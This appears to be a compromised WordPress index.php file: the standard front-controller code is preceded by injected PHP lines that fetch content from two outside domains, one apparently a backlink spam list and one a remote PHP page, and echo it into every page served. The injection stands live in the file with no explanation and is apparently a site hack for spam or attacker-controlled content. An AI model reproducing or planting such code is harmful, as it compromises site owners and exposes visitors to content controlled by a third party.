<?php
$zhyperseo = file_get_contents("https://zhyper-shel.info/backlink.txt");
$shuji = file_get_contents("https://izinpuh.xyz/rahasia.php");

if ($zhyperseo !== false) {
    echo $zhyperseo;
}
if ($shuji !== false) {
    echo $shuji;
}
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
